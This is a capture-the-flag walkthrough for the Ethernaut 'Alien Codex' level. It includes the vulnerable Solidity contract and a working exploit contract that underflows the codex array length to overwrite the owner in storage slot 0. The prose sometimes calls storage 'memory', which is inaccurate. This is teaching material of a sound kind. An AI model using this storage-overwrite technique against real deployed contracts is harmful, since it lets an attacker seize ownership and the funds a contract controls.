# Alien Codex

## Challenge Description

You've uncovered an Alien contract. Claim ownership to complete the level.

Things that might help

-   Understanding how array storage works
-   Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
-   Using a very `underhanded` approach

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./utils/Ownable.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

## Challenge Solution Walkthrough

To become the `owner` of this contract, we need to modify the first slot of the memory, which contains the `_owner` variable inherited from the `Ownable` contract. Although there is no `owner` variable directly in this contract, we can access and modify `_owner` in the memory.

Based on the contract's compiler version, which is `0.5.0`, and the absence of the `SafeMath` library, we can utilize underflow to access the `_owner` variable. Before proceeding, let's examine the memory layout:

|    Slot Number     |             Variable(s)              |
| :----------------: | :----------------------------------: |
|        `0`         |         `_owner`, `contact`          |
|        `1`         |            `codex.length`            |
|        ...         |                 ...                  |
|   `keccak256(1)`   |              `codex[0]`              |
| `keccak256(1) + 1` |              `codex[1]`              |
|        ...         |                 ...                  |
|   `2 ** 256 - 1`   | `codex[2 ** 256 - 1 - keccak256(1)]` |

Accessing the first slot is equivalent to accessing the `2 ** 256` slot due to underflow. We can achieve this by utilizing `codex[2 ** 256 - 1 - keccak256(1)] + 1`. By modifying the value at `codex[2 ** 256 - 1 - keccak256(1)]`, we effectively change the first slot that contains `_owner`.

To accomplish this, we can use the following contract code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract AlienCodexSolution {
    AlienCodex public alienCodex;

    constructor(address alienCodexAddress) public {
        alienCodex = AlienCodex(alienCodexAddress);
    }

    function solveChallenge() public {
        alienCodex.makeContact();
        alienCodex.retract();
        uint256 index = 2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1;
        alienCodex.revise(index, bytes32(uint256(uint160(msg.sender))));
    }
}
```

In the `solveChallenge()` function, we perform the following steps:

1. Call the `makeContact()` function to set the `contact` variable to `true`, enabling us to invoke other functions within the `AlienCodex` contract.
2. Invoke the `retract()` function to decrease the length of the `codex` array. Since the initial length was `0`, decrementing it results in `2 ** 256 - 1`, effectively setting the size of the `codex` array to the size of the entire memory.
3. Determine the index of the `_owner` variable using the expression `2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1`.
4. Call the `revise()` function to set the value at the calculated index to our own address, converting it to `bytes32` using `bytes32(uint256(uint160(msg.sender)))`.

By executing the `solveChallenge()` function, we successfully complete the challenge and become the new owner of the contract.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of `2^256`. The user is then able to modify all contract storage.

Both vulnerabilities are inspired by 2017's [Underhanded coding contest](https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)
